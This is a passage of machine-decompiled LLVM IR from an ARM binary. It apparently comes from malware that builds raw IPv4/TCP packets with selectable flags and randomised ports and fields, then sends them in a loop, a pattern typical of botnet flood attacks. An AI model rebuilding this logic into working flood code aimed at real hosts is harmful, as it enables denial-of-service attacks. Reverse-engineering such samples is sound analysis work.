  store i32 %v3_be08, i32* %r1.global-to-local, align 4
  %v0_be0c = load i32, i32* @r7, align 4
  %v2_be0c = icmp eq i32 %v0_be0c, 0
  store i1 %v2_be0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_be0c, label %dec_label_pc_c250, label %dec_label_pc_be24

dec_label_pc_be24:                                ; preds = %dec_label_pc_bdec
  %v3_be2c = mul i32 %v5_bd64, 65536
  %v1_be30 = add i32 %v3_be2c, 2621440
  %v3_be3c = udiv i32 %v1_be30, 65536
  store i32 %v3_be3c, i32* @sl, align 4
  %v3_be40 = urem i32 %v5_bca0, 65536
  store i32 %v3_be40, i32* @r6, align 4
  %v1_be50 = urem i32 %v6_bcd4, 2
  %v1_be54 = urem i32 %v6_bcec, 2
  %v1_be58 = urem i32 %v6_bd04, 2
  store i32 %v6_bd04, i32* %r1.global-to-local, align 4
  %v0_be70 = load i32, i32* @sb, align 4
  %v1_be70 = urem i32 %v0_be70, 2
  %v1_be74 = urem i32 %v6_bd1c, 2
  store i32 %v1_be74, i32* %r2.global-to-local, align 4
  %v1_be78 = urem i32 %v6_bd34, 2
  store i32 %v1_be78, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_be84 = urem i32 %v6_bd04, 256
  store i32 %v1_be84, i32* @sb, align 4
  %v4_bfe0 = sext i8 %v5_bc0c to i32
  %sext = mul i32 %v6_bc28, 16777216
  %v4_bffc = sdiv i32 %sext, 16777216
  %tmp = sub nsw i32 0, %v1_be50
  %v4_bee8 = and i32 %tmp, 32
  %tmp55 = sub nsw i32 0, %v1_be54
  %v4_befc = and i32 %tmp55, 16
  %tmp56 = sub nsw i32 0, %v1_be58
  %v4_bf10 = and i32 %tmp56, 8
  %tmp57 = sub nsw i32 0, %v1_be74
  %v4_bf24 = and i32 %tmp57, 4
  %tmp58 = sub nsw i32 0, %v1_be78
  %v3_bf38 = and i32 %tmp58, 2
  br label %dec_label_pc_bfa0

dec_label_pc_be94:                                ; preds = %dec_label_pc_bfa0, %dec_label_pc_c014
  %v2_be98 = phi i32 [ %v0_c00c, %dec_label_pc_bfa0 ], [ %v2_be98.pre, %dec_label_pc_c014 ]
  %v3_be98 = add i32 %v2_be98, 9
  %v4_be98 = inttoptr i32 %v3_be98 to i8*
  store i8 6, i8* %v4_be98, align 1
  %v3_be9c = load i32, i32* %stack_var_-44, align 4
  %v5_bea4 = mul i32 %v3_be9c, 24
  store i32 %v5_bea4, i32* %r3.global-to-local, align 4
  store i32 %v6_bda0, i32* %r2.global-to-local, align 4
  %v1_beac = load i32, i32* @r5, align 4
  %v2_beac = add i32 %v1_beac, 12
  %v3_beac = inttoptr i32 %v2_beac to i32*
  store i32 %v6_bda0, i32* %v3_beac, align 4
  %v0_beb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_beb0 = load i32, i32* @r8, align 4
  %v2_beb0 = add i32 %v1_beb0, %v0_beb0
  store i32 %v2_beb0, i32* %r3.global-to-local, align 4
  %v1_beb4 = add i32 %v2_beb0, 16
  %v2_beb4 = inttoptr i32 %v1_beb4 to i32*
  %v3_beb4 = load i32, i32* %v2_beb4, align 4
  store i32 %v3_beb4, i32* %r2.global-to-local, align 4
  %v1_bebc = load i32, i32* @r5, align 4
  %v2_bebc = add i32 %v1_bebc, 16
  %v3_bebc = inttoptr i32 %v2_bebc to i32*
  store i32 %v3_beb4, i32* %v3_bebc, align 4
  %v1_bec0 = call i32 @function_14898(i32 %v3_be04)
  %v2_bec0 = trunc i32 %v1_bec0 to i16
  %v3_bec4 = load i32, i32* @r5, align 4
  %v4_bec4 = add i32 %v3_bec4, 20
  %v5_bec4 = inttoptr i32 %v4_bec4 to i16*
  store i16 %v2_bec0, i16* %v5_bec4, align 2
  %v1_becc = call i32 @function_14898(i32 %v3_be08)
  %v2_becc = trunc i32 %v1_becc to i16
  %v3_bed0 = load i32, i32* @r4, align 4
  %v4_bed0 = add i32 %v3_bed0, 2
  %v5_bed0 = inttoptr i32 %v4_bed0 to i16*
  store i16 %v2_becc, i16* %v5_bed0, align 2
  %v0_bed4 = load i32, i32* @r6, align 4
  %v1_bed8 = call i32 @function_14898(i32 %v0_bed4)
  %v0_bedc = load i32, i32* @r4, align 4
  %v1_bedc = add i32 %v0_bedc, 13
  %v2_bedc = inttoptr i32 %v1_bedc to i8*
  %v3_bedc = load i8, i8* %v2_bedc, align 1
  %v4_bedc = zext i8 %v3_bedc to i32
  store i32 %v1_be50, i32* %r1.global-to-local, align 4
  %v1_bee4 = and i32 %v4_bedc, 223
  %v5_bee8 = or i32 %v1_bee4, %v4_bee8
  store i32 %v5_bee8, i32* %r3.global-to-local, align 4
  %v1_beec = trunc i32 %v5_bee8 to i8
  store i8 %v1_beec, i8* %v2_bedc, align 1
  %v0_bef0 = load i32, i32* @r4, align 4
  %v1_bef0 = add i32 %v0_bef0, 13
  %v2_bef0 = inttoptr i32 %v1_bef0 to i8*
  %v3_bef0 = load i8, i8* %v2_bef0, align 1
  %v4_bef0 = zext i8 %v3_bef0 to i32
  store i32 %v1_be54, i32* %r3.global-to-local, align 4
  %v1_bef8 = and i32 %v4_bef0, 239
  %v5_befc = or i32 %v1_bef8, %v4_befc
  store i32 %v5_befc, i32* %r2.global-to-local, align 4
  %v1_bf00 = trunc i32 %v5_befc to i8
  store i8 %v1_bf00, i8* %v2_bef0, align 1
  %v0_bf04 = load i32, i32* @r4, align 4
  %v1_bf04 = add i32 %v0_bf04, 13
  %v2_bf04 = inttoptr i32 %v1_bf04 to i8*
  %v3_bf04 = load i8, i8* %v2_bf04, align 1
  %v4_bf04 = zext i8 %v3_bf04 to i32
  store i32 %v1_be58, i32* %r1.global-to-local, align 4
  %v1_bf0c = and i32 %v4_bf04, 247
  %v5_bf10 = or i32 %v1_bf0c, %v4_bf10
  store i32 %v5_bf10, i32* %r3.global-to-local, align 4
  %v1_bf14 = trunc i32 %v5_bf10 to i8
  store i8 %v1_bf14, i8* %v2_bf04, align 1
  %v0_bf18 = load i32, i32* @r4, align 4
  %v1_bf18 = add i32 %v0_bf18, 13
  %v2_bf18 = inttoptr i32 %v1_bf18 to i8*
  %v3_bf18 = load i8, i8* %v2_bf18, align 1
  %v4_bf18 = zext i8 %v3_bf18 to i32
  store i32 %v1_be74, i32* %r3.global-to-local, align 4
  %v1_bf20 = and i32 %v4_bf18, 251
  %v5_bf24 = or i32 %v1_bf20, %v4_bf24
  store i32 %v5_bf24, i32* %r2.global-to-local, align 4
  %v1_bf28 = trunc i32 %v5_bf24 to i8
  store i8 %v1_bf28, i8* %v2_bf18, align 1
  %v0_bf2c = load i32, i32* @r4, align 4
  %v1_bf2c = add i32 %v0_bf2c, 13
  %v2_bf2c = inttoptr i32 %v1_bf2c to i8*
  %v3_bf2c = load i8, i8* %v2_bf2c, align 1
  %v4_bf2c = zext i8 %v3_bf2c to i32
  store i32 %v1_be78, i32* %r1.global-to-local, align 4
  %v1_bf34 = and i32 %v4_bf2c, 253
  %v4_bf38 = or i32 %v1_bf34, %v3_bf38
  store i32 %v4_bf38, i32* %r3.global-to-local, align 4
  %v1_bf3c = trunc i32 %v4_bf38 to i8
  store i8 %v1_bf3c, i8* %v2_bf2c, align 1
  %v0_bf40 = load i32, i32* @r4, align 4
  %v1_bf40 = add i32 %v0_bf40, 12
  %v2_bf40 = inttoptr i32 %v1_bf40 to i8*
  %v3_bf40 = load i8, i8* %v2_bf40, align 1
  %v4_bf40 = zext i8 %v3_bf40 to i32
  store i32 %v4_bf40, i32* %r2.global-to-local, align 4
  %v1_bf44 = add i32 %v0_bf40, 13
  %v2_bf44 = inttoptr i32 %v1_bf44 to i8*
  %v3_bf44 = load i8, i8* %v2_bf44, align 1
  %v4_bf44 = zext i8 %v3_bf44 to i32
  store i32 %v1_be70, i32* %r1.global-to-local, align 4
  %tmp59 = urem i8 %v3_bf40, 16
  %v1_bf4c = zext i8 %tmp59 to i32
  %v1_bf50 = and i32 %v4_bf44, 254
  %v2_bf54 = or i32 %v1_bf50, %v1_be70
  store i32 %v2_bf54, i32* %r3.global-to-local, align 4
  %v1_bf58 = or i32 %v1_bf4c, 80
  store i32 %v1_bf58, i32* %r2.global-to-local, align 4
  %v1_bf5c = trunc i32 %v2_bf54 to i8
  store i8 %v1_bf5c, i8* %v2_bf44, align 1
  %v0_bf60 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf60 = trunc i32 %v0_bf60 to i8
  %v2_bf60 = load i32, i32* @r4, align 4
  %v3_bf60 = add i32 %v2_bf60, 12
  %v4_bf60 = inttoptr i32 %v3_bf60 to i8*
  store i8 %v1_bf60, i8* %v4_bf60, align 1
  %v1_bf64 = load i32, i32* @r4, align 4
  %v2_bf64 = add i32 %v1_bf64, 4
  %v3_bf64 = inttoptr i32 %v2_bf64 to i32*
  store i32 %v1_bed8, i32* %v3_bf64, align 4
  %v0_bf68 = call i32 @function_f570()
  %v1_bf68 = trunc i32 %v0_bf68 to i16
  %v0_bf6c = load i32, i32* @sb, align 4
  %v2_bf6c = icmp eq i32 %v0_bf6c, 0
  store i1 %v2_bf6c, i1* %cpsr_z.global-to-local, align 1
  %v3_bf78.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf6c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be94
  %v2_bf70 = add i32 %v3_bf78.pre, 13
  %v3_bf70 = inttoptr i32 %v2_bf70 to i8*
  %v4_bf70 = load i8, i8* %v3_bf70, align 1
  %v5_bf70 = zext i8 %v4_bf70 to i32
  %v2_bf74 = or i32 %v5_bf70, 8
  store i32 %v2_bf74, i32* @r3, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be94, %bb
  %v4_bf78 = add i32 %v3_bf78.pre, 14
  %v5_bf78 = inttoptr i32 %v4_bf78 to i16*
  store i16 %v1_bf68, i16* %v5_bf78, align 2
  store i32 %v5_bd64, i32* %r1.global-to-local, align 4
  %v0_bf80 = load i32, i32* @r5, align 4
  %v1_bf80 = add i32 %v0_bf80, 40
  br i1 %v2_bf6c, label %bb54, label %bb53

bb53:                                             ; preds = %.thread
  %v1_bf84 = load i32, i32* @r3, align 4
  %v2_bf84 = trunc i32 %v1_bf84 to i8
  %v3_bf84 = load i32, i32* @r4, align 4
  %v4_bf84 = add i32 %v3_bf84, 13
  %v5_bf84 = inttoptr i32 %v4_bf84 to i8*
  store i8 %v2_bf84, i8* %v5_bf84, align 1
  br label %bb54

bb54:                                             ; preds = %.thread, %bb53
  %v2_bf88 = inttoptr i32 %v1_bf80 to i16*
  %v3_bf88 = call i32 @function_f770(i16* %v2_bf88, i32 %v5_bd64)
  %v3_bf8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf8c, i32* %r3.global-to-local, align 4
  %v1_bf90 = add i32 %v3_bf8c, 1
  store i32 %v1_bf90, i32* @r4, align 4
  %v1_bf94 = load i32, i32* @r7, align 4
  %v9_bf94 = icmp eq i32 %v1_bf90, %v1_bf94
  store i1 %v9_bf94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf90, i32* %stack_var_-44, align 4
  %v6_bf9c = icmp slt i32 %v1_bf90, %v1_bf94
  br i1 %v6_bf9c, label %dec_label_pc_bfa0, label %dec_label_pc_c038

dec_label_pc_bfa0:                                ; preds = %bb54, %dec_label_pc_be24
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_bfac = call i32 @function_13258(i32 1510, i32 1)
  store i32 %v2_bbd4, i32* %r2.global-to-local, align 4
  %v3_bfb4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bfb4, i32* %r3.global-to-local, align 4
  %v2_bfb8 = load i32, i32* @r4, align 4
  %v5_bfb8 = mul i32 %v2_bfb8, 4
  %v6_bfb8 = add i32 %v5_bfb8, %v2_bbd4
  %v7_bfb8 = inttoptr i32 %v6_bfb8 to i32*
  store i32 %v2_bfac, i32* %v7_bfb8, align 4
  %v0_bfbc = load i32, i32* %r2.global-to-local, align 4
  %v1_bfbc = load i32, i32* %r3.global-to-local, align 4
  %v4_bfbc = mul i32 %v1_bfbc, 4
  %v5_bfbc = add i32 %v4_bfbc, %v0_bfbc
  %v6_bfbc = inttoptr i32 %v5_bfbc to i32*
  %v7_bfbc = load i32, i32* %v6_bfbc, align 4
  store i32 %v7_bfbc, i32* @r5, align 4
  %v1_bfc0 = inttoptr i32 %v7_bfbc to i8*
  %v2_bfc0 = load i8, i8* %v1_bfc0, align 1
  %tmp60 = urem i8 %v2_bfc0, 16
  %v1_bfc4 = zext i8 %tmp60 to i32
  %v1_bfc8 = or i32 %v1_bfc4, 64
  store i32 %v1_bfc8, i32* %r2.global-to-local, align 4
  %v1_bfcc = trunc i32 %v1_bfc8 to i8
  store i8 %v1_bfcc, i8* %v1_bfc0, align 1
  %v0_bfd0 = load i32, i32* @r5, align 4
  %v1_bfd0 = inttoptr i32 %v0_bfd0 to i8*
  %v2_bfd0 = load i8, i8* %v1_bfd0, align 1
  %v1_bfd4 = and i8 %v2_bfd0, -16
  %v1_bfd8 = or i8 %v1_bfd4, 5
  store i8 %v1_bfd8, i8* %v1_bfd0, align 1
  store i32 %v4_bfe0, i32* %r3.global-to-local, align 4
  %v0_bfe4 = load i32, i32* @sl, align 4
  %v2_bfe8 = load i32, i32* @r5, align 4
  %v3_bfe8 = add i32 %v2_bfe8, 1
  %v4_bfe8 = inttoptr i32 %v3_bfe8 to i8*
  store i8 %v5_bc0c, i8* %v4_bfe8, align 1
  %v1_bfec = call i32 @function_14898(i32 %v0_bfe4)
  %v2_bfec = trunc i32 %v1_bfec to i16
  %v3_bff0 = load i32, i32* @r5, align 4
  %v4_bff0 = add i32 %v3_bff0, 2
  %v5_bff0 = inttoptr i32 %v4_bff0 to i16*
  store i16 %v2_bfec, i16* %v5_bff0, align 2
  %v1_bff8 = call i32 @function_14898(i32 %v3_be00)
  %v2_bff8 = trunc i32 %v1_bff8 to i16
  store i32 %v4_bffc, i32* %r1.global-to-local, align 4
  %v0_c000 = load i32, i32* @fp, align 4
  %v2_c000 = icmp eq i32 %v0_c000, 0
  store i1 %v2_c000, i1* %cpsr_z.global-to-local, align 1
  %v3_c004 = load i32, i32* @r5, align 4
  %v4_c004 = add i32 %v3_c004, 4
  %v5_c004 = inttoptr i32 %v4_c004 to i16*
  store i16 %v2_bff8, i16* %v5_c004, align 2
  %v0_c008 = load i32, i32* %r1.global-to-local, align 4
  %v1_c008 = trunc i32 %v0_c008 to i8
  %v2_c008 = load i32, i32* @r5, align 4
  %v3_c008 = add i32 %v2_c008, 8
  %v4_c008 = inttoptr i32 %v3_c008 to i8*
  store i8 %v1_c008, i8* %v4_c008, align 1
  %v0_c00c = load i32, i32* @r5, align 4
  %v1_c00c = add i32 %v0_c00c, 20
  store i32 %v1_c00c, i32* @r4, align 4
  %v0_c010 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c010, label %dec_label_pc_be94, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_bfa0
  %v1_c018 = call i32 @function_14898(i32 16384)
  %v2_c018 = trunc i32 %v1_c018 to i16
  %v3_c01c = load i32, i32* @r5, align 4
  %v4_c01c = add i32 %v3_c01c, 6
  %v5_c01c = inttoptr i32 %v4_c01c to i16*
  store i16 %v2_c018, i16* %v5_c01c, align 2
  %v2_be98.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_be94

dec_label_pc_c024:                                ; preds = %dec_label_pc_bdc4
  store i32 %v3_bdb4, i32* @r0, align 4
  %v1_c028 = call i32 @function_15b6c(i32 %v3_bdb4)
  br label %dec_label_pc_c02c

dec_label_pc_c02c:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_c024
  %v1_c034 = phi i32 [ %v3_bdb4, %dec_label_pc_bbb8 ], [ %v1_c028, %dec_label_pc_c024 ]
  store i32 %v3_bbb8, i32* %r4.global-to-local, align 4
  store i32 %v18_bbb8, i32* %sb.global-to-local, align 4
  store i32 %v24_bbb8, i32* %fp.global-to-local, align 4
  store i32 %v27_bbb8, i32* %lr.global-to-local, align 4
  ret i32 %v1_c034

dec_label_pc_c038:                                ; preds = %bb54
  store i32 %v5_bd64, i32* %r2.global-to-local, align 4
  %v1_c03c = add i32 %v5_bd64, 20
  store i32 %v1_c03c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_c044

dec_label_pc_c044:                                ; preds = %dec_label_pc_c250, %dec_label_pc_c038
  %v0_c0546 = phi i32 [ %v1_bf94, %dec_label_pc_c038 ], [ 0, %dec_label_pc_c250 ]
  %stack_var_-148.0 = phi i32 [ %v3_be2c, %dec_label_pc_c038 ], [ %v3_c25c, %dec_label_pc_c250 ]
  %storemerge = add i32 %v5_bd64, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-148.0, i32* %r2.global-to-local, align 4
  %v1_c048 = add i32 %stack_var_-148.0, 1310720
  store i32 %v1_c048, i32* %r3.global-to-local, align 4
  %v3_c04c = udiv i32 %v1_c048, 65536
  store i32 %v3_c04c, i32* @sl, align 4
  %v3_c1b4 = icmp eq i32 %v6_bda0, -1
  %v8_c1b4 = icmp eq i32 %v6_bda0, -1
  %v3_c1d0 = icmp eq i32 %v3_be00, 65535
  %v2_c234 = icmp eq i32 %v1_bd8c, 0
  br label %dec_label_pc_c050

dec_label_pc_c050:                                ; preds = %dec_label_pc_c050, %dec_label_pc_c170, %dec_label_pc_c044
  %v0_c054 = phi i32 [ %v0_c0546, %dec_label_pc_c044 ], [ 0, %dec_label_pc_c170 ], [ 0, %dec_label_pc_c050 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c054 = icmp eq i32 %v0_c054, 0
  store i1 %v2_c054, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c054, label %dec_label_pc_c050, label %dec_label_pc_c060

dec_label_pc_c060:                                ; preds = %dec_label_pc_c050, %dec_label_pc_c170
  br label %dec_label_pc_c064

dec_label_pc_c064:                                ; preds = %dec_label_pc_c0e4, %dec_label_pc_c060
  %v1_c078 = phi i32 [ %v1_c160, %dec_label_pc_c0e4 ], [ 0, %dec_label_pc_c060 ]
  %v5_c068 = mul i32 %v1_c078, 24
  %v1_c06c = load i32, i32* @r8, align 4
  %v2_c06c = add i32 %v1_c06c, %v5_c068
  store i32 %v2_c06c, i32* %r3.global-to-local, align 4
  store i32 %v2_bbd4, i32* %r1.global-to-local, align 4
  %v1_c074 = add i32 %v2_c06c, 20
  %v2_c074 = inttoptr i32 %v1_c074 to i8*
  %v3_c074 = load i8, i8* %v2_c074, align 1
  %v4_c074 = zext i8 %v3_c074 to i32
  store i32 %v4_c074, i32* %r2.global-to-local, align 4
  %v4_c078 = mul i32 %v1_c078, 4
  %v5_c078 = add i32 %v4_c078, %v2_bbd4
  %v6_c078 = inttoptr i32 %v5_c078 to i32*
  %v7_c078 = load i32, i32* %v6_c078, align 4
  store i32 %v7_c078, i32* @r5, align 4
  %v7_c07c = icmp eq i8 %v3_c074, 31
  store i1 %v7_c07c, i1* %cpsr_z.global-to-local, align 1
  %v1_c080 = add i32 %v7_c078, 20
  store i32 %v1_c080, i32* @r6, align 4
  %tmp61 = icmp ult i8 %v3_c074, 32
  br i1 %tmp61, label %dec_label_pc_c184, label %dec_label_pc_c088

dec_label_pc_c088:                                ; preds = %dec_label_pc_c064
  store i32 %v6_bda0, i32* %r2.global-to-local, align 4
  store i1 %v8_c1b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c1b4, label %dec_label_pc_c1c0, label %dec_label_pc_c094

dec_label_pc_c094:                                ; preds = %dec_label_pc_c184, %dec_label_pc_c088
  store i32 %v3_be00, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c1d0, label %dec_label_pc_c1dc, label %dec_label_pc_c0a8

dec_label_pc_c0a8:                                ; preds = %dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge, %dec_label_pc_c094
  %v1_c0ac = phi i32 [ %v1_c0ac.pre, %dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge ], [ 65535, %dec_label_pc_c094 ]
  store i32 %v3_be04, i32* %r1.global-to-local, align 4
  %v9_c0ac = icmp eq i32 %v3_be04, %v1_c0ac
  store i1 %v9_c0ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0ac, label %dec_label_pc_c1f0, label %dec_label_pc_c0b4

dec_label_pc_c0b4:                                ; preds = %dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge, %dec_label_pc_c0a8
  %v1_c0b8 = phi i32 [ %v1_c0b8.pre, %dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge ], [ %v1_c0ac, %dec_label_pc_c0a8 ]
  store i32 %v3_be08, i32* %r2.global-to-local, align 4
  %v9_c0b8 = icmp eq i32 %v3_be08, %v1_c0b8
  store i1 %v9_c0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0b8, label %dec_label_pc_c204, label %dec_label_pc_c0c0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge, %dec_label_pc_c0b4
  %v1_c0c4 = phi i32 [ %v1_c0c4.pre, %dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge ], [ %v1_c0b8, %dec_label_pc_c0b4 ]
  store i32 %v5_bca0, i32* %r3.global-to-local, align 4
  %v9_c0c4 = icmp eq i32 %v5_bca0, %v1_c0c4
  store i1 %v9_c0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0c4, label %dec_label_pc_c218, label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c204.dec_label_pc_c0cc_crit_edge, %dec_label_pc_c0c0
  %v1_c0d0 = phi i32 [ %v1_c0d0.pre, %dec_label_pc_c204.dec_label_pc_c0cc_crit_edge ], [ %v1_c0c4, %dec_label_pc_c0c0 ]
  store i32 %v6_bcbc, i32* %r1.global-to-local, align 4
  %v9_c0d0 = icmp eq i32 %v6_bcbc, %v1_c0d0
  store i1 %v9_c0d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0d0, label %dec_label_pc_c22c, label %dec_label_pc_c0d8

dec_label_pc_c0d8:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0cc
  store i32 %v1_bd8c, i32* %r2.global-to-local, align 4
  store i1 %v2_c234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c234, label %dec_label_pc_c0e4, label %dec_label_pc_c240

dec_label_pc_c0e4:                                ; preds = %dec_label_pc_c0d8, %dec_label_pc_c22c, %dec_label_pc_c240
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0e8 = load i32, i32* @r5, align 4
  %v3_c0e8 = add i32 %v2_c0e8, 10
  %v4_c0e8 = inttoptr i32 %v3_c0e8 to i16*
  store i16 0, i16* %v4_c0e8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c0f0 = load i32, i32* @r5, align 4
  store i32 %v0_c0f0, i32* @r0, align 4
  %v2_c0f4 = call i32 @function_dadc(i32 %v0_c0f0, i32 20)
  %v3_c0f4 = trunc i32 %v2_c0f4 to i16
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c0fc = load i32, i32* @r5, align 4
  %v4_c0fc = add i32 %v3_c0fc, 10
  %v5_c0fc = inttoptr i32 %v4_c0fc to i16*
  store i16 %v3_c0f4, i16* %v5_c0fc, align 2
  %v0_c100 = load i32, i32* %r1.global-to-local, align 4
  %v1_c100 = trunc i32 %v0_c100 to i16
  %v2_c100 = load i32, i32* @r6, align 4
  %v3_c100 = add i32 %v2_c100, 16
  %v4_c100 = inttoptr i32 %v3_c100 to i16*
  store i16 %v1_c100, i16* %v4_c100, align 2
  %v0_c104 = load i32, i32* @sl, align 4
  %v1_c108 = call i32 @function_14898(i32 %v0_c104)
  %v0_c10c = load i32, i32* @r6, align 4
  store i32 %v0_c10c, i32* @r1, align 4
  store i32 %v1_c108, i32* %r2.global-to-local, align 4
  %v0_c114 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_c114, i32* %r3.global-to-local, align 4
  %v0_c118 = load i32, i32* @r5, align 4
  %v4_c11c = call i32 @function_db2c(i32 %v0_c118, i32 %v0_c10c, i32 %v1_c108, i32 %v0_c114)
  %v5_c11c = trunc i32 %v4_c11c to i16
  %v3_c120 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c120, i32* %r3.global-to-local, align 4
  %v3_c124 = mul i32 %v3_c120, 32
  store i32 %v3_c124, i32* %lr.global-to-local, align 4
  %v3_c128 = load i32, i32* @r6, align 4
  %v4_c128 = add i32 %v3_c128, 16
  %v5_c128 = inttoptr i32 %v4_c128 to i16*
  store i16 %v5_c11c, i16* %v5_c128, align 2
  %v0_c12c = load i32, i32* %lr.global-to-local, align 4
  %v1_c12c = load i32, i32* %r3.global-to-local, align 4
  %tmp62 = mul i32 %v1_c12c, -8
  %v5_c12c = add i32 %v0_c12c, %tmp62
  store i32 %v5_c12c, i32* %lr.global-to-local, align 4
  %v0_c130 = load i32, i32* @r6, align 4
  %v1_c130 = add i32 %v0_c130, 2
  %v2_c130 = inttoptr i32 %v1_c130 to i16*
  %v3_c130 = load i16, i16* %v2_c130, align 2
  %v1_c134 = load i32, i32* @r8, align 4
  %v2_c134 = add i32 %v1_c134, %v5_c12c
  store i32 %v2_c134, i32* @lr, align 4
  %v3_c138 = add i32 %v2_c134, 2
  %v4_c138 = inttoptr i32 %v3_c138 to i16*
  store i16 %v3_c130, i16* %v4_c138, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c144 = load i32, i32* @r5, align 4
  store i32 %v0_c144, i32* @r1, align 4
  store i32 %v3_bdb4, i32* @r0, align 4
  %v0_c14c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c14c, i32* @r2, align 4
  %v0_c158 = call i32 @function_14ae4()
  %v3_c15c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c15c, i32* %r3.global-to-local, align 4
  %v1_c160 = add i32 %v3_c15c, 1
  %v1_c164 = load i32, i32* @r7, align 4
  %v9_c164 = icmp eq i32 %v1_c160, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c160, i32* %stack_var_-44, align 4
  %v5_c16c = icmp slt i32 %v1_c160, %v1_c164
  br i1 %v5_c16c, label %dec_label_pc_c064, label %dec_label_pc_c170

dec_label_pc_c170:                                ; preds = %dec_label_pc_c0e4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c174 = icmp eq i32 %v1_c164, 0
  store i1 %v2_c174, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c174, label %dec_label_pc_c050, label %dec_label_pc_c060

dec_label_pc_c184:                                ; preds = %dec_label_pc_c064
  %v1_c184 = add i32 %v2_c06c, 16
  %v2_c184 = inttoptr i32 %v1_c184 to i32*
  %v3_c184 = load i32, i32* %v2_c184, align 4
  %v1_c188 = call i32 @function_14a1c(i32 %v3_c184)
  store i32 %v1_c188, i32* %r4.global-to-local, align 4
  %v0_c190 = call i32 @function_f570()
  %v3_c194 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c194, i32* %r2.global-to-local, align 4
  %v5_c19c = mul i32 %v3_c194, 24
  %v1_c1a0 = load i32, i32* @r8, align 4
  %v2_c1a0 = add i32 %v1_c1a0, %v5_c19c
  store i32 %v2_c1a0, i32* %r3.global-to-local, align 4
  %v1_c1a4 = add i32 %v2_c1a0, 20
  %v2_c1a4 = inttoptr i32 %v1_c1a4 to i8*
  %v3_c1a4 = load i8, i8* %v2_c1a4, align 1
  %v4_c1a4 = zext i8 %v3_c1a4 to i32
  store i32 %v4_c1a4, i32* %r2.global-to-local, align 4
  %v0_c1a8 = load i32, i32* %r4.global-to-local, align 4
  %v7_c1a8 = lshr i32 %v0_c190, %v4_c1a4
  %v8_c1a8 = add i32 %v7_c1a8, %v0_c1a8
  %v1_c1ac = call i32 @function_14874(i32 %v8_c1a8)
  store i32 %v6_bda0, i32* %r2.global-to-local, align 4
  store i1 %v8_c1b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c1b8 = load i32, i32* @r5, align 4
  %v2_c1b8 = add i32 %v1_c1b8, 16
  %v3_c1b8 = inttoptr i32 %v2_c1b8 to i32*
  store i32 %v1_c1ac, i32* %v3_c1b8, align 4
  br i1 %v3_c1b4, label %dec_label_pc_c1c0, label %dec_label_pc_c094

dec_label_pc_c1c0:                                ; preds = %dec_label_pc_c184, %dec_label_pc_c088
  %v0_c1c0 = call i32 @function_f570()
  store i32 %v3_be00, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c1d0, i1* %cpsr_z.global-to-local, align 1
  %v1_c1d4 = load i32, i32* @r5, align 4
  %v2_c1d4 = add i32 %v1_c1d4, 12
  %v3_c1d4 = inttoptr i32 %v2_c1d4 to i32*
  store i32 %v0_c1c0, i32* %v3_c1d4, align 4
  br i1 %v3_c1d0, label %dec_label_pc_c1dc, label %dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge

dec_label_pc_c1c0.dec_label_pc_c0a8_crit_edge:    ; preds = %dec_label_pc_c1c0
  %v1_c0ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0a8

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1c0, %dec_label_pc_c094
  %v0_c1dc = call i32 @function_f570()
  %v1_c1dc = trunc i32 %v0_c1dc to i16
  store i32 %v3_be04, i32* %r1.global-to-local, align 4
